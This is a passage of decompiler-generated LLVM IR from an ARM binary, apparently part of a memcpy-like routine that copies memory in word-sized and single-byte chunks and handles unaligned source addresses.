  %v10_fc5c = inttoptr i32 %v9_fc5c to i32*
  %v11_fc5c = load i32, i32* %v10_fc5c, align 4
  store i32 %v11_fc5c, i32* %lr.global-to-local, align 4
  %v12_fc5c = add i32 %v0_fc5c, 16
  store i32 %v12_fc5c, i32* %r1.global-to-local, align 4
  %v1_fc60 = inttoptr i32 %v0_fc60 to i32*
  store i32 %v2_fc5c, i32* %v1_fc60, align 4
  %v3_fc60 = add i32 %v0_fc60, 4
  %v4_fc60 = inttoptr i32 %v3_fc60 to i32*
  %v5_fc60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fc60, i32* %v4_fc60, align 4
  %v6_fc60 = add i32 %v0_fc60, 8
  %v7_fc60 = inttoptr i32 %v6_fc60 to i32*
  %v8_fc60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_fc60, i32* %v7_fc60, align 4
  %v9_fc60 = add i32 %v0_fc60, 12
  %v10_fc60 = inttoptr i32 %v9_fc60 to i32*
  %v11_fc60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_fc60, i32* %v10_fc60, align 4
  %v12_fc60 = add i32 %v0_fc60, 16
  store i32 %v12_fc60, i32* %r0.global-to-local, align 4
  %v0_fc64 = load i32, i32* %r1.global-to-local, align 4
  %v1_fc64 = inttoptr i32 %v0_fc64 to i32*
  %v2_fc64 = load i32, i32* %v1_fc64, align 4
  store i32 %v2_fc64, i32* @r3, align 4
  %v3_fc64 = add i32 %v0_fc64, 4
  %v4_fc64 = inttoptr i32 %v3_fc64 to i32*
  %v5_fc64 = load i32, i32* %v4_fc64, align 4
  store i32 %v5_fc64, i32* %r4.global-to-local, align 4
  %v6_fc64 = add i32 %v0_fc64, 8
  %v7_fc64 = inttoptr i32 %v6_fc64 to i32*
  %v8_fc64 = load i32, i32* %v7_fc64, align 4
  store i32 %v8_fc64, i32* @ip, align 4
  %v9_fc64 = add i32 %v0_fc64, 12
  %v10_fc64 = inttoptr i32 %v9_fc64 to i32*
  %v11_fc64 = load i32, i32* %v10_fc64, align 4
  store i32 %v11_fc64, i32* @lr, align 4
  %v12_fc64 = add i32 %v0_fc64, 16
  store i32 %v12_fc64, i32* @r1, align 4
  %v1_fc68 = inttoptr i32 %v12_fc60 to i32*
  store i32 %v2_fc64, i32* %v1_fc68, align 4
  %v3_fc68 = add i32 %v0_fc60, 20
  %v4_fc68 = inttoptr i32 %v3_fc68 to i32*
  %v5_fc68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fc68, i32* %v4_fc68, align 4
  %v6_fc68 = add i32 %v0_fc60, 24
  %v7_fc68 = inttoptr i32 %v6_fc68 to i32*
  %v8_fc68 = load i32, i32* @ip, align 4
  store i32 %v8_fc68, i32* %v7_fc68, align 4
  %v9_fc68 = add i32 %v0_fc60, 28
  %v10_fc68 = inttoptr i32 %v9_fc68 to i32*
  %v11_fc68 = load i32, i32* @lr, align 4
  store i32 %v11_fc68, i32* %v10_fc68, align 4
  %v12_fc68 = add i32 %v0_fc60, 32
  store i32 %v12_fc68, i32* %r0.global-to-local, align 4
  %v0_fc6c = load i32, i32* %r2.global-to-local, align 4
  %v2_fc6c = add i32 %v0_fc6c, -32
  store i32 %v2_fc6c, i32* %r2.global-to-local, align 4
  %v6_fc70 = icmp slt i32 %v0_fc6c, 32
  br i1 %v6_fc70, label %dec_label_pc_fc74, label %dec_label_pc_fc5c.dec_label_pc_fc5c_crit_edge

dec_label_pc_fc5c.dec_label_pc_fc5c_crit_edge:    ; preds = %dec_label_pc_fc5c
  %v0_fc5c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_fc5c

dec_label_pc_fc74:                                ; preds = %dec_label_pc_fc5c
  %v4_fc74 = add i32 %v0_fc6c, -16
  %v6_fc74 = add i32 %v0_fc6c, 2147483616
  %v7_fc74 = and i32 %v4_fc74, %v6_fc74
  %v8_fc74 = icmp slt i32 %v7_fc74, 0
  store i1 %v8_fc74, i1* %cpsr_v.global-to-local, align 1
  %v9_fc74 = icmp slt i32 %v4_fc74, 0
  store i1 %v9_fc74, i1* %cpsr_n.global-to-local, align 1
  %v5_fc78 = icmp slt i32 %v2_fc6c, -16
  br i1 %v5_fc78, label %.thread1, label %bb129

bb129:                                            ; preds = %dec_label_pc_fc74
  %v6_fc78 = load i32, i32* @r1, align 4
  %v7_fc78 = inttoptr i32 %v6_fc78 to i32*
  %v8_fc78 = load i32, i32* %v7_fc78, align 4
  store i32 %v8_fc78, i32* @r3, align 4
  %v9_fc78 = add i32 %v6_fc78, 4
  %v10_fc78 = inttoptr i32 %v9_fc78 to i32*
  %v11_fc78 = load i32, i32* %v10_fc78, align 4
  store i32 %v11_fc78, i32* %r4.global-to-local, align 4
  %v12_fc78 = add i32 %v6_fc78, 8
  %v13_fc78 = inttoptr i32 %v12_fc78 to i32*
  %v14_fc78 = load i32, i32* %v13_fc78, align 4
  store i32 %v14_fc78, i32* @ip, align 4
  %v15_fc78 = add i32 %v6_fc78, 12
  %v16_fc78 = inttoptr i32 %v15_fc78 to i32*
  %v17_fc78 = load i32, i32* %v16_fc78, align 4
  store i32 %v17_fc78, i32* @lr, align 4
  %v18_fc78 = add i32 %v6_fc78, 16
  store i32 %v18_fc78, i32* @r1, align 4
  %v7_fc7c = inttoptr i32 %v12_fc68 to i32*
  store i32 %v8_fc78, i32* %v7_fc7c, align 4
  %v9_fc7c = add i32 %v0_fc60, 36
  %v10_fc7c = inttoptr i32 %v9_fc7c to i32*
  %v11_fc7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_fc7c, i32* %v10_fc7c, align 4
  %v12_fc7c = add i32 %v0_fc60, 40
  %v13_fc7c = inttoptr i32 %v12_fc7c to i32*
  %v14_fc7c = load i32, i32* @ip, align 4
  store i32 %v14_fc7c, i32* %v13_fc7c, align 4
  %v15_fc7c = add i32 %v0_fc60, 44
  %v16_fc7c = inttoptr i32 %v15_fc7c to i32*
  %v17_fc7c = load i32, i32* @lr, align 4
  store i32 %v17_fc7c, i32* %v16_fc7c, align 4
  %v18_fc7c = add i32 %v0_fc60, 48
  store i32 %v18_fc7c, i32* %r0.global-to-local, align 4
  %v6_fc80 = load i32, i32* %r2.global-to-local, align 4
  %v7_fc80 = add i32 %v6_fc80, -16
  store i32 %v7_fc80, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_fc74, %bb129
  %v3_fc90101 = phi i32 [ %v12_fc68, %dec_label_pc_fc74 ], [ %v18_fc7c, %bb129 ]
  %v0_fc8895 = phi i32 [ %v2_fc6c, %dec_label_pc_fc74 ], [ %v7_fc80, %bb129 ]
  %v2_fc84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fc84, i32* @r4, align 4
  br label %dec_label_pc_fc88

dec_label_pc_fc88:                                ; preds = %dec_label_pc_fc50, %.thread1
  %v3_fc90100 = phi i32 [ %v0_fc6092, %dec_label_pc_fc50 ], [ %v3_fc90101, %.thread1 ]
  %v0_fc88 = phi i32 [ %v2_fc50, %dec_label_pc_fc50 ], [ %v0_fc8895, %.thread1 ]
  %v1_fc88 = add i32 %v0_fc88, 20
  store i32 %v1_fc88, i32* %r2.global-to-local, align 4
  %v3_fc88 = sub i32 0, %v0_fc88
  %v4_fc88 = and i32 %v1_fc88, %v3_fc88
  %v5_fc88 = icmp slt i32 %v4_fc88, 0
  store i1 %v5_fc88, i1* %cpsr_v.global-to-local, align 1
  %v6_fc88 = icmp slt i32 %v1_fc88, 0
  store i1 %v6_fc88, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fc8c

dec_label_pc_fc8c:                                ; preds = %.thread117, %dec_label_pc_fc88
  %v0_fc9c.pre148 = phi i32 [ %v0_fc9c.pre, %.thread117 ], [ %v1_fc88, %dec_label_pc_fc88 ]
  %v3_fc90 = phi i32 [ %v3_fc9098118, %.thread117 ], [ %v3_fc90100, %dec_label_pc_fc88 ]
  %v1_fc94 = phi i1 [ %v1_fc98, %.thread117 ], [ %v5_fc88, %dec_label_pc_fc88 ]
  %v0_fc94 = phi i1 [ %v0_fc98, %.thread117 ], [ %v6_fc88, %dec_label_pc_fc88 ]
  %v2_fc8c = xor i1 %v1_fc94, %v0_fc94
  br i1 %v2_fc8c, label %.thread117, label %bb130

bb130:                                            ; preds = %dec_label_pc_fc8c
  %v3_fc8c = load i32, i32* @r1, align 4
  %v4_fc8c = inttoptr i32 %v3_fc8c to i32*
  %v5_fc8c = load i32, i32* %v4_fc8c, align 4
  store i32 %v5_fc8c, i32* @r3, align 4
  %v6_fc8c = add i32 %v3_fc8c, 4
  %v7_fc8c = inttoptr i32 %v6_fc8c to i32*
  %v8_fc8c = load i32, i32* %v7_fc8c, align 4
  store i32 %v8_fc8c, i32* @ip, align 4
  %v9_fc8c = add i32 %v3_fc8c, 8
  %v10_fc8c = inttoptr i32 %v9_fc8c to i32*
  %v11_fc8c = load i32, i32* %v10_fc8c, align 4
  store i32 %v11_fc8c, i32* @lr, align 4
  %v12_fc8c = add i32 %v3_fc8c, 12
  store i32 %v12_fc8c, i32* @r1, align 4
  %v4_fc90 = inttoptr i32 %v3_fc90 to i32*
  store i32 %v5_fc8c, i32* %v4_fc90, align 4
  %v6_fc90 = add i32 %v3_fc90, 4
  %v7_fc90 = inttoptr i32 %v6_fc90 to i32*
  %v8_fc90 = load i32, i32* @ip, align 4
  store i32 %v8_fc90, i32* %v7_fc90, align 4
  %v9_fc90 = add i32 %v3_fc90, 8
  %v10_fc90 = inttoptr i32 %v9_fc90 to i32*
  %v11_fc90 = load i32, i32* @lr, align 4
  store i32 %v11_fc90, i32* %v10_fc90, align 4
  %v12_fc90 = add i32 %v3_fc90, 12
  store i32 %v12_fc90, i32* %r0.global-to-local, align 4
  %v3_fc94 = load i32, i32* %r2.global-to-local, align 4
  %v4_fc94 = add i32 %v3_fc94, -12
  store i32 %v4_fc94, i32* %r2.global-to-local, align 4
  %v6_fc94 = sub i32 11, %v3_fc94
  %v7_fc94 = and i32 %v6_fc94, %v3_fc94
  %v8_fc94 = icmp slt i32 %v7_fc94, 0
  store i1 %v8_fc94, i1* %cpsr_v.global-to-local, align 1
  %v9_fc94 = icmp slt i32 %v4_fc94, 0
  store i1 %v9_fc94, i1* %cpsr_n.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_fc8c, %bb130
  %v0_fc9c.pre = phi i32 [ %v4_fc94, %bb130 ], [ %v0_fc9c.pre148, %dec_label_pc_fc8c ]
  %v3_fc9098118 = phi i32 [ %v12_fc90, %bb130 ], [ %v3_fc90, %dec_label_pc_fc8c ]
  %v1_fc98 = phi i1 [ %v8_fc94, %bb130 ], [ %v1_fc94, %dec_label_pc_fc8c ]
  %v0_fc98 = phi i1 [ %v9_fc94, %bb130 ], [ %v0_fc94, %dec_label_pc_fc8c ]
  %v2_fc98 = xor i1 %v1_fc98, %v0_fc98
  br i1 %v2_fc98, label %dec_label_pc_fc9c, label %dec_label_pc_fc8c

dec_label_pc_fc9c:                                ; preds = %.thread117, %dec_label_pc_fc48
  %v7_fcac = phi i32 [ %v0_fc6092, %dec_label_pc_fc48 ], [ %v3_fc9098118, %.thread117 ]
  %v0_fc9c = phi i32 [ %v2_fc48, %dec_label_pc_fc48 ], [ %v0_fc9c.pre, %.thread117 ]
  %v2_fc9c = add i32 %v0_fc9c, 8
  store i32 %v2_fc9c, i32* %r2.global-to-local, align 4
  %v4_fc9c = sub i32 0, %v0_fc9c
  %v5_fc9c = and i32 %v2_fc9c, %v4_fc9c
  %v6_fc9c = icmp slt i32 %v5_fc9c, 0
  store i1 %v6_fc9c, i1* %cpsr_v.global-to-local, align 1
  %v7_fc9c = icmp slt i32 %v2_fc9c, 0
  store i1 %v7_fc9c, i1* %cpsr_n.global-to-local, align 1
  %v5_fca0 = icmp slt i32 %v0_fc9c, -8
  br i1 %v5_fca0, label %bb132, label %dec_label_pc_fca4

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc9c
  %v6_fca4 = add i32 %v0_fc9c, 4
  store i32 %v6_fca4, i32* %r2.global-to-local, align 4
  %v8_fca4 = sub i32 -5, %v0_fc9c
  %v9_fca4 = and i32 %v8_fca4, %v2_fc9c
  %v10_fca4 = icmp slt i32 %v9_fca4, 0
  store i1 %v10_fca4, i1* %cpsr_v.global-to-local, align 1
  %v11_fca4 = icmp slt i32 %v6_fca4, 0
  store i1 %v11_fca4, i1* %cpsr_n.global-to-local, align 1
  %v5_fca8 = icmp slt i32 %v2_fc9c, 4
  %v6_fca8 = load i32, i32* @r1, align 4
  %v7_fca8 = inttoptr i32 %v6_fca8 to i32*
  %v8_fca8 = load i32, i32* %v7_fca8, align 4
  store i32 %v8_fca8, i32* @r3, align 4
  %v10_fca8 = add i32 %v6_fca8, 4
  br i1 %v5_fca8, label %.thread5, label %bb131

.thread5:                                         ; preds = %dec_label_pc_fca4
  store i32 %v10_fca8, i32* @r1, align 4
  %v8_fcac = inttoptr i32 %v7_fcac to i32*
  store i32 %v8_fca8, i32* %v8_fcac, align 4
  %v9_fcac = load i32, i32* %r0.global-to-local, align 4
  %v10_fcac = add i32 %v9_fcac, 4
  store i32 %v10_fcac, i32* %r0.global-to-local, align 4
  %v0_fcbc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb132

bb131:                                            ; preds = %dec_label_pc_fca4
  %v10_fcb0 = inttoptr i32 %v10_fca8 to i32*
  %v11_fcb0 = load i32, i32* %v10_fcb0, align 4
  store i32 %v11_fcb0, i32* @ip, align 4
  %v12_fcb0 = add i32 %v6_fca8, 8
  store i32 %v12_fcb0, i32* @r1, align 4
  %v7_fcb4 = inttoptr i32 %v7_fcac to i32*
  store i32 %v8_fca8, i32* %v7_fcb4, align 4
  %v9_fcb4 = add i32 %v7_fcac, 4
  %v10_fcb4 = inttoptr i32 %v9_fcb4 to i32*
  %v11_fcb4 = load i32, i32* @ip, align 4
  store i32 %v11_fcb4, i32* %v10_fcb4, align 4
  %v12_fcb4 = add i32 %v7_fcac, 8
  store i32 %v12_fcb4, i32* %r0.global-to-local, align 4
  %v6_fcb8 = load i32, i32* %r2.global-to-local, align 4
  %v7_fcb8 = add i32 %v6_fcb8, -4
  store i32 %v7_fcb8, i32* %r2.global-to-local, align 4
  br label %bb132

bb132:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_fc9c, %bb, %dec_label_pc_fdf8, %dec_label_pc_fd8c, %dec_label_pc_fe64, %bb131
  %v2_fccc = phi i32 [ %v10_fcac, %.thread5 ], [ %v0_fd5c75, %.thread11 ], [ %v7_fcac, %dec_label_pc_fc9c ], [ %v1_fc20, %bb ], [ %v2_fccc113, %dec_label_pc_fdf8 ], [ %v2_fccc112, %dec_label_pc_fd8c ], [ %v2_fccc111, %dec_label_pc_fe64 ], [ %v12_fcb4, %bb131 ]
  %v0_fcbc = phi i32 [ %v0_fcbc.pre, %.thread5 ], [ %v2_fd04, %.thread11 ], [ %v2_fc9c, %dec_label_pc_fc9c ], [ %v2_fc30, %bb ], [ %v0_fcbc109, %dec_label_pc_fdf8 ], [ %v0_fcbc108, %dec_label_pc_fd8c ], [ %v0_fcbc107, %dec_label_pc_fe64 ], [ %v7_fcb8, %bb131 ]
  %v1_fcbc = add i32 %v0_fcbc, 4
  store i32 %v1_fcbc, i32* @r2, align 4
  %v3_fcbc = sub i32 0, %v0_fcbc
  %v4_fcbc = and i32 %v1_fcbc, %v3_fcbc
  %v5_fcbc = icmp slt i32 %v4_fcbc, 0
  store i1 %v5_fcbc, i1* %cpsr_v.global-to-local, align 1
  %v6_fcbc = icmp slt i32 %v1_fcbc, 0
  store i1 %v6_fcbc, i1* %cpsr_n.global-to-local, align 1
  %v7_fcbc = icmp eq i32 %v1_fcbc, 0
  store i1 %v7_fcbc, i1* @cpsr_z, align 1
  br i1 %v7_fcbc, label %bb133, label %bb134

bb133:                                            ; preds = %bb132
  %v3_fcc0 = load i8*, i8** %stack_var_-8, align 4
  %v4_fcc0 = ptrtoint i8* %v3_fcc0 to i32
  store i32 %v4_fcc0, i32* %r0.global-to-local, align 4
  ret i32 %v4_fcc0

bb134:                                            ; preds = %bb132
  %v1_fcc4 = add i32 %v0_fcbc, 2
  %v3_fcc4 = sub i32 -3, %v0_fcbc
  %v4_fcc4 = and i32 %v3_fcc4, %v1_fcbc
  %v5_fcc4 = icmp slt i32 %v4_fcc4, 0
  store i1 %v5_fcc4, i1* %cpsr_v.global-to-local, align 1
  %v6_fcc4 = icmp slt i32 %v1_fcc4, 0
  store i1 %v6_fcc4, i1* %cpsr_n.global-to-local, align 1
  %v7_fcc4 = icmp eq i32 %v1_fcbc, 2
  store i1 %v7_fcc4, i1* @cpsr_z, align 1
  %v0_fcc8 = load i32, i32* @r1, align 4
  %v1_fcc8 = inttoptr i32 %v0_fcc8 to i8*
  %v2_fcc8 = load i8, i8* %v1_fcc8, align 1
  %v3_fcc8 = zext i8 %v2_fcc8 to i32
  store i32 %v3_fcc8, i32* @r3, align 4
  %v5_fcc8 = add i32 %v0_fcc8, 1
  store i32 %v5_fcc8, i32* @r1, align 4
  %v3_fccc = inttoptr i32 %v2_fccc to i8*
  store i8 %v2_fcc8, i8* %v3_fccc, align 1
  %v4_fccc = load i32, i32* %r0.global-to-local, align 4
  %v5_fccc = add i32 %v4_fccc, 1
  store i32 %v5_fccc, i32* %r0.global-to-local, align 4
  %v0_fcd0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_fcd0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_fcd0 = xor i1 %v0_fcd0, %v1_fcd0
  br i1 %v2_fcd0, label %.thread119, label %bb135

bb135:                                            ; preds = %bb134
  %v3_fcd0 = load i32, i32* @r1, align 4
  %v4_fcd0 = inttoptr i32 %v3_fcd0 to i8*
  %v5_fcd0 = load i8, i8* %v4_fcd0, align 1
  %v6_fcd0 = zext i8 %v5_fcd0 to i32
  store i32 %v6_fcd0, i32* @r3, align 4
  %v8_fcd0 = add i32 %v3_fcd0, 1
  store i32 %v8_fcd0, i32* @r1, align 4
  %v6_fcd4 = inttoptr i32 %v5_fccc to i8*
  store i8 %v5_fcd0, i8* %v6_fcd4, align 1
  %v7_fcd4 = load i32, i32* %r0.global-to-local, align 4
  %v8_fcd4 = add i32 %v7_fcd4, 1
  store i32 %v8_fcd4, i32* %r0.global-to-local, align 4
  %v1_fcd8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_fcd8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb134, %bb135
  %v7_fcdc = phi i32 [ %v8_fcd4, %bb135 ], [ %v5_fccc, %bb134 ]
  %v2_fcdc = phi i1 [ %v2_fcd8.pre, %bb135 ], [ %v1_fcd0, %bb134 ]
  %v1_fcdc = phi i1 [ %v1_fcd8.pre, %bb135 ], [ %v0_fcd0, %bb134 ]
  %v0_fcd8 = load i1, i1* @cpsr_z, align 1
  %v3_fcd8 = xor i1 %v2_fcdc, %v1_fcdc
  %v4_fcd8 = or i1 %v0_fcd8, %v3_fcd8
  br i1 %v4_fcd8, label %.thread120, label %bb136

bb136:                                            ; preds = %.thread119
  %v5_fcd8 = load i32, i32* @r1, align 4
  %v6_fcd8 = inttoptr i32 %v5_fcd8 to i8*
  %v7_fcd8 = load i8, i8* %v6_fcd8, align 1
  %v8_fcd8 = zext i8 %v7_fcd8 to i32
  store i32 %v8_fcd8, i32* @r3, align 4
  %v10_fcd8 = add i32 %v5_fcd8, 1
  store i32 %v10_fcd8, i32* @r1, align 4
  %v8_fcdc = inttoptr i32 %v7_fcdc to i8*
  store i8 %v7_fcd8, i8* %v8_fcdc, align 1
  %v9_fcdc = load i32, i32* %r0.global-to-local, align 4
  %v10_fcdc = add i32 %v9_fcdc, 1
  store i32 %v10_fcdc, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb136
  %v2_fce0 = load i8*, i8** %stack_var_-8, align 4
  %v3_fce0 = ptrtoint i8* %v2_fce0 to i32
  store i32 %v3_fce0, i32* %r0.global-to-local, align 4
  ret i32 %v3_fce0

dec_label_pc_fce4:                                ; preds = %dec_label_pc_fc38
  %v1_fce4 = sub nsw i32 4, %v1_fc38
  store i32 %v1_fce4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_fce8 = icmp ult i32 %v1_fce4, 2
  store i1 %v8_fce8, i1* %cpsr_n.global-to-local, align 1
  %v1_fcec = inttoptr i32 %v0_fc20 to i8*
  %v2_fcec = load i8, i8* %v1_fcec, align 1
  %v3_fcec = zext i8 %v2_fcec to i32
  store i32 %v3_fcec, i32* @r3, align 4
  %v5_fcec = add i32 %v0_fc20, 1
  store i32 %v5_fcec, i32* @r1, align 4
  store i8 %v2_fcec, i8* %v5_fc2c, align 1
  %v4_fcf0 = load i32, i32* %r0.global-to-local, align 4
  %v5_fcf0 = add i32 %v4_fcf0, 1
  store i32 %v5_fcf0, i32* %r0.global-to-local, align 4
  br i1 %v8_fce8, label %.thread11, label %bb137

bb137:                                            ; preds = %dec_label_pc_fce4
  %v9_fce8 = icmp eq i32 %v1_fce4, 2
  %v6_fcf4 = load i32, i32* @r1, align 4
  %v7_fcf4 = inttoptr i32 %v6_fcf4 to i8*
  %v8_fcf4 = load i8, i8* %v7_fcf4, align 1
  %v9_fcf4 = zext i8 %v8_fcf4 to i32
  store i32 %v9_fcf4, i32* @r3, align 4
  %v11_fcf4 = add i32 %v6_fcf4, 1
  store i32 %v11_fcf4, i32* @r1, align 4
  %v9_fcf8 = inttoptr i32 %v5_fcf0 to i8*
  store i8 %v8_fcf4, i8* %v9_fcf8, align 1
  %v10_fcf8 = load i32, i32* %r0.global-to-local, align 4
  %v11_fcf8 = add i32 %v10_fcf8, 1
  store i32 %v11_fcf8, i32* %r0.global-to-local, align 4
  br i1 %v9_fce8, label %.thread11, label %bb138

bb138:                                            ; preds = %bb137
  %v8_fcfc = load i32, i32* @r1, align 4
  %v9_fcfc = inttoptr i32 %v8_fcfc to i8*
  %v10_fcfc = load i8, i8* %v9_fcfc, align 1
  %v11_fcfc = zext i8 %v10_fcfc to i32
  store i32 %v11_fcfc, i32* @r3, align 4
  %v13_fcfc = add i32 %v8_fcfc, 1
  store i32 %v13_fcfc, i32* @r1, align 4
  %v11_fd00 = inttoptr i32 %v11_fcf8 to i8*
  store i8 %v10_fcfc, i8* %v11_fd00, align 1
  %v12_fd00 = load i32, i32* %r0.global-to-local, align 4
  %v13_fd00 = add i32 %v12_fd00, 1
  store i32 %v13_fd00, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb137, %dec_label_pc_fce4, %bb138
  %v0_fd5c75 = phi i32 [ %v11_fcf8, %bb137 ], [ %v5_fcf0, %dec_label_pc_fce4 ], [ %v13_fd00, %bb138 ]
  %v0_fd04 = load i32, i32* %r2.global-to-local, align 4
  %v1_fd04 = load i32, i32* @ip, align 4
  %v2_fd04 = sub i32 %v0_fd04, %v1_fd04
  store i32 %v2_fd04, i32* %r2.global-to-local, align 4
  %v4_fd04 = xor i32 %v1_fd04, %v0_fd04
  %v5_fd04 = xor i32 %v2_fd04, %v0_fd04
  %v6_fd04 = and i32 %v5_fd04, %v4_fd04
  %v7_fd04 = icmp slt i32 %v6_fd04, 0
  store i1 %v7_fd04, i1* %cpsr_v.global-to-local, align 1
  %v8_fd04 = icmp slt i32 %v2_fd04, 0
  store i1 %v8_fd04, i1* %cpsr_n.global-to-local, align 1
  %v5_fd08 = icmp slt i32 %v0_fd04, %v1_fd04
  br i1 %v5_fd08, label %bb132, label %dec_label_pc_fd0c

dec_label_pc_fd0c:                                ; preds = %.thread11
  %v0_fd0c = load i32, i32* @r1, align 4
  %v1_fd0c = urem i32 %v0_fd0c, 4
  store i32 %v1_fd0c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fd0c = icmp eq i32 %v1_fd0c, 0
  %extract.t123 = trunc i32 %v0_fd0c to i2
  br i1 %v2_fd0c, label %dec_label_pc_fc48, label %dec_label_pc_fd14

dec_label_pc_fd14:                                ; preds = %dec_label_pc_fc40, %dec_label_pc_fd0c
  %v0_fd5c74 = phi i32 [ %v1_fc20, %dec_label_pc_fc40 ], [ %v0_fd5c75, %dec_label_pc_fd0c ]
  %v0_fe08 = phi i32 [ %v2_fc30, %dec_label_pc_fc40 ], [ %v2_fd04, %dec_label_pc_fd0c ]
  %v0_fd1c.off0 = phi i2 [ %extract.t, %dec_label_pc_fc40 ], [ %extract.t123, %dec_label_pc_fd0c ]
  %v0_fd14 = phi i32 [ %v0_fc20, %dec_label_pc_fc40 ], [ %v0_fd0c, %dec_label_pc_fd0c ]
  %v1_fd14 = and i32 %v0_fd14, -4
  store i32 %v1_fd14, i32* %r1.global-to-local, align 4
  %v1_fd18 = inttoptr i32 %v1_fd14 to i32*
  %v2_fd18 = load i32, i32* %v1_fd18, align 4
  store i32 %v2_fd18, i32* @lr, align 4
  %v4_fd18 = add i32 %v1_fd14, 4
  store i32 %v4_fd18, i32* %r1.global-to-local, align 4
  %v2_fe00 = add i32 %v0_fe08, -12
  %v4_fe00 = sub i32 11, %v0_fe08
  %v5_fe00 = and i32 %v4_fe00, %v0_fe08
  %v6_fe00 = icmp slt i32 %v5_fe00, 0
  store i1 %v6_fe00, i1* %cpsr_v.global-to-local, align 1
  %v7_fe00 = icmp slt i32 %v2_fe00, 0
  store i1 %v7_fe00, i1* %cpsr_n.global-to-local, align 1
  %v5_fe04 = icmp slt i32 %v0_fe08, 12
  switch i2 %v0_fd1c.off0, label %dec_label_pc_fd28 [
    i2 -1, label %dec_label_pc_fe00
    i2 -2, label %dec_label_pc_fd94
  ]

dec_label_pc_fd28:                                ; preds = %dec_label_pc_fd14
  br i1 %v5_fe04, label %dec_label_pc_fd74, label %dec_label_pc_fd30

dec_label_pc_fd30:                                ; preds = %dec_label_pc_fd28
  store i32 %v2_fe00, i32* %r2.global-to-local, align 4
  %v3_fd34 = load i32, i32* @r4, align 4
  store i32 %v3_fd34, i32* %stack_var_-16, align 4
  %v6_fd34 = load i32, i32* @r5, align 4
  store i32 %v6_fd34, i32* %stack_var_-12, align 4
  br label %dec_label_pc_fd38

dec_label_pc_fd38:                                ; preds = %dec_label_pc_fd38.dec_label_pc_fd38_crit_edge, %dec_label_pc_fd30
  %v0_fd5c = phi i32 [ %v12_fd5c, %dec_label_pc_fd38.dec_label_pc_fd38_crit_edge ], [ %v0_fd5c74, %dec_label_pc_fd30 ]
  %v0_fd3c = phi i32 [ %v0_fd3c.pre, %dec_label_pc_fd38.dec_label_pc_fd38_crit_edge ], [ %v4_fd18, %dec_label_pc_fd30 ]
  %v0_fd38 = phi i32 [ %v0_fd38.pre, %dec_label_pc_fd38.dec_label_pc_fd38_crit_edge ], [ %v2_fd18, %dec_label_pc_fd30 ]
  %v3_fd38 = udiv i32 %v0_fd38, 256
  %v1_fd3c = inttoptr i32 %v0_fd3c to i32*
  %v2_fd3c = load i32, i32* %v1_fd3c, align 4
  store i32 %v2_fd3c, i32* %r4.global-to-local, align 4
  %v3_fd3c = add i32 %v0_fd3c, 4
  %v4_fd3c = inttoptr i32 %v3_fd3c to i32*
  %v5_fd3c = load i32, i32* %v4_fd3c, align 4
  store i32 %v5_fd3c, i32* %r5.global-to-local, align 4
  %v6_fd3c = add i32 %v0_fd3c, 8
  %v7_fd3c = inttoptr i32 %v6_fd3c to i32*
  %v8_fd3c = load i32, i32* %v7_fd3c, align 4
  store i32 %v8_fd3c, i32* %ip.global-to-local, align 4
  %v9_fd3c = add i32 %v0_fd3c, 12
  %v10_fd3c = inttoptr i32 %v9_fd3c to i32*
  %v11_fd3c = load i32, i32* %v10_fd3c, align 4
  store i32 %v11_fd3c, i32* @lr, align 4
  %v12_fd3c = add i32 %v0_fd3c, 16
  store i32 %v12_fd3c, i32* %r1.global-to-local, align 4
  %v4_fd40 = mul i32 %v2_fd3c, 16777216
  %v5_fd40 = or i32 %v4_fd40, %v3_fd38
  store i32 %v5_fd40, i32* @r3, align 4
  %v3_fd44 = udiv i32 %v2_fd3c, 256
  %v4_fd48 = mul i32 %v5_fd3c, 16777216
  %v5_fd48 = or i32 %v4_fd48, %v3_fd44
  store i32 %v5_fd48, i32* %r4.global-to-local, align 4
  %v3_fd4c = udiv i32 %v5_fd3c, 256
  %v4_fd50 = mul i32 %v8_fd3c, 16777216
  %v5_fd50 = or i32 %v4_fd50, %v3_fd4c
  store i32 %v5_fd50, i32* %r5.global-to-local, align 4
  %v3_fd54 = udiv i32 %v8_fd3c, 256
  %v4_fd58 = mul i32 %v11_fd3c, 16777216
  %v5_fd58 = or i32 %v4_fd58, %v3_fd54
  store i32 %v5_fd58, i32* @ip, align 4
  %v1_fd5c = inttoptr i32 %v0_fd5c to i32*
  store i32 %v5_fd40, i32* %v1_fd5c, align 4
  %v3_fd5c = add i32 %v0_fd5c, 4
  %v4_fd5c = inttoptr i32 %v3_fd5c to i32*
  %v5_fd5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fd5c, i32* %v4_fd5c, align 4
  %v6_fd5c = add i32 %v0_fd5c, 8
  %v7_fd5c = inttoptr i32 %v6_fd5c to i32*
  %v8_fd5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_fd5c, i32* %v7_fd5c, align 4
  %v9_fd5c = add i32 %v0_fd5c, 12
  %v10_fd5c = inttoptr i32 %v9_fd5c to i32*
  %v11_fd5c = load i32, i32* @ip, align 4
  store i32 %v11_fd5c, i32* %v10_fd5c, align 4
  %v12_fd5c = add i32 %v0_fd5c, 16
  store i32 %v12_fd5c, i32* %r0.global-to-local, align 4
